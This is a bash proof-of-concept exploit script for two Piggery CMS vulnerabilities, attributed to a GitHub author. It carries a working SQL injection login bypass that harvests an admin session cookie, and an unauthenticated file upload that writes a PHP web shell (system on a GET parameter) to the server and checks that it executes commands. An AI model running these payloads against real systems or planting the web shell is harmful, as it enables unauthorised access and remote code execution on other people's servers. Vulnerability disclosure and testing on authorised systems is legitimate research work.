#!/bin/bash
# Exploit for CVE-2023-37628 and CVE-2023-37629
# Author : 1337kid
# https://github.com/1337kid/Piggery_CMS_multiple_vulns_PoC

if [[ $1 == '' ]]; then
    echo "No URL specified!"
    exit
fi

base_url=$1

admin_sqli() {
    # CVE-2023-37628 - SQLi
    req_data="username='%20or%201=1;%20--%20-&password=sew&submit="
    phpsessid=$(curl -d $req_data $base_url -s -v 2>&1 | grep -ow "[0-9a-z]\{26\}")
    echo "Open $base_url on your browser and set PHPSESSID as $phpsessid to access dashboard.php"
    exit
}

unauth_file_upload() {
    # CVE-2023-37629 - File upload vuln
    echo "Generating shell.php"
#===========
cat > shell.php << EOF
<?php system(\$_GET['cmd']); ?>
EOF
#===========
    echo "done"
    curl -s -F pigphoto=@shell.php -F submit=pwned $base_url/add-pig.php > /dev/null
    req=$(curl -s -I $base_url"uploadfolder/shell.php?cmd=id" |  head -1 | awk '{print $2}')
    if [[ $req == "200" ]]; then
        echo "Shell uploaded to $(echo $base_url)uploadfolder/shell.php"
    else
        echo "Failed to upload a shell"
    fi

}

req=$(curl -I -s $base_url | head -1 | awk '{print $2}')
if [[ $req -eq "200" ]]; then
    echo "[1] CVE-2023-37628 - Login bypass through SQLi"
    echo "[2] CVE-2023-37629 - php shell upload"
    echo -n "Choice : "
    read ch
    if [[ $ch == "1" ]]; then
        admin_sqli
    elif [[ $ch == "2" ]]; then
        unauth_file_upload
    else
        exit
    fi
else
    echo "Error"
    echo "Status Code: $req"
fi